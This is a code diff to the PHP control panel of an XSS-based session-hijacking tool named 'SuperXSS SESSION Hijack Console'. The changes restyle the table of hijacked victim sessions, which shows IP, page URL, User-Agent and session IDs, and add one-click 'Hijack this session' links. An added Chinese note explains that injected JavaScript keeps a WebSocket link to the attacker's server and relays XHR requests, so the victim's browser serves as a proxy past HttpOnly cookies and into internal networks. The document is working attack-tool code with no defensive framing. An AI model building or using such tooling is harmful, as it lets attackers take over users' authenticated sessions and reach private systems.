@@ -300,25 +300,29 @@ $Hijack_console_worker -> onMessage = function($connection, $data)use($Config){
 	$sessionlist = $GD_Client -> sessionlist;
 	$eval_pool = $GD_Client -> eval_pool;
 	if(!isset($_COOKIE['hijack_session']) && !isset($_GET['hijack_session'])){
-		$html = '<html><head><title>SuperXSS SESSION Hijack Console</title><meta http-equiv="refresh" content="5"><style>*,*::after,*::before{box-sizing:border-box}.container-fluid{margin-left:auto;margin-right:auto;padding-left:15px;padding-right:15px;width:100%}body{color:#212529;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";font-size:1rem;font-weight:400;line-height:1.5;text-align:left}:root{--blue:#007bff;--breakpoint-lg:992px;--breakpoint-md:768px;--breakpoint-sm:576px;--breakpoint-xl:1200px;--breakpoint-xs:0;--cyan:#17a2b8;--danger:#dc3545;--dark:#343a40;--font-family-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--font-family-sans-serif:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";--gray:#6c757d;--gray-dark:#343a40;--green:#28a745;--indigo:#6610f2;--info:#17a2b8;--light:#f8f9fa;--orange:#fd7e14;--pink:#e83e8c;--primary:#007bff;--purple:#6f42c1;--red:#dc3545;--secondary:#6c757d;--success:#28a745;--teal:#20c997;--warning:#ffc107;--white:#fff;--yellow:#ffc107}.text-center{text-align:center!important}.h3,h3{font-size:1.75rem}.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6{color:inherit;font-family:inherit;font-weight:500;line-height:1.2;margin-bottom:.5rem}blockquote{margin:0 0 1rem}.btn:not(:disabled):not(.disabled){cursor:pointer}.btn-block{display:block;width:100%}.btn-success{background-color:#28a745;border-color:#28a745;color:#fff}.btn{-moz-user-select:none;border:1px solid transparent;border-radius:.25rem;display:inline-block;font-size:1rem;font-weight:400;line-height:1.5;padding:.375rem .75rem;text-align:center;transition:color .15s ease-in-out 0s,background-color .15s ease-in-out 0s,border-color .15s ease-in-out 0s,box-shadow .15s ease-in-out 0s;vertical-align:middle;white-space:nowrap}</style>
-<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><script src="https://cdn.bootcss.com/bootstrap/4.0.0/js/bootstrap.min.js"></script></head><body>';
-		$html .= '<div class="container-fluid"><div class="row-fluid"><div class="span12"><h3 class="text-center">SuperXSS SESSION Hijack Console</h3><div class="row-fluid"><div class="span8">';
+		$html = '<html><head><title>SuperXSS SESSION Hijack Console</title><link href="https://cdn.bootcss.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet"><script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><script src="https://cdn.bootcss.com/bootstrap/4.0.0/js/bootstrap.min.js"></script></head><body>';
+		$html .= '<div class="container-fluid"><div class="row-fluid"><div class="span12"><h3 class="text-center">SuperXSS SESSION Hijack Console</h3>';
+
+		$html .= '<div class="alert alert-dismissible alert-info"><h4 class="alert-heading"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提示！</font></font></h4><p class="mb-0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">';
+		$html .= '当X别人站的时候，遇到Httponly flag时，被x到的站位于内网无法直接访问时。你要的是一个基于网页套接字的客户端网页代理程序，客户端JS被注入之后会创建到指定服务端的网页套接字连接并接收命令进行XHR请求，从而使得无法直接访问的后台等可以通过客户端浏览器本身作为代理访问。';
+		$html .= '</font></p></div><div class="row-fluid"><div class="span8">';
+		$html .= '<table  class="table table-hover"><thead><tr><th>上次心跳包</th> <th>IP</th><th>URL</th> <th>User-Agent</th><th>Cookie</th> <th>Hijack</th></tr></thead>';
 		foreach($sessionlist as $session => $info){
 			$s = time() - $info['LastPing'];
-			$html .= '<blockquote>';
-			$html .= '<p>上次心跳包: ' . $s . '秒前</p>';
-			$html .= '<p>IP: '.$info['IP'].'</p>';
-			$html .= '<p>URL: '.$info['URL'].'</p>';
-			$html .= '<p>User-Agent: '.$info['UA'].'</p>';
-			$html .= '<p>Referer: '.$info['REFERER'].'</p>';
-			$html .= '<p>Cookie: '.$info['COOKIE'].'</p>';
-			$html .= '</blockquote>';
+			$html .= '<tbody><tr>';
+			$html .= '<td>' . $s . '秒前</td>';
+			$html .= '<td>'.$info['IP'].'</td>';
+			$html .= '<td>'.$info['URL'].'</td>';
+			$html .= '<td>'.$info['UA'].'</td>';
+			$html .= '<td>hijack_session='. $session .'</td>';
+			$html .= '<td><a href="/?hijack_session='. $session .'" class="text-decoration-none">Hijack this session</a></td>';
+			$html .= '</tr></tbody>';
 		}
-		$html .= '</div><div class="span4">';
+/*		$html .= '</div><div class="span4">';
 		foreach($sessionlist as $session => $info){
 			$html .= '<a href="/?hijack_session='. $session .'" class="btn btn-success btn-large btn-block" type="button">Hijack this session</a>';
-		}
-		$html .= '</div></div></div></div></div>';
+		}*/
+		$html .= '</table></div></div></div></div></div>';
 		$connection -> send($html);	
 		//$connection -> send(var_export($_SERVER, true).var_export($_POST, true).var_export($_FILES, true));
 	}elseif(isset($_GET['hijack_session'])){
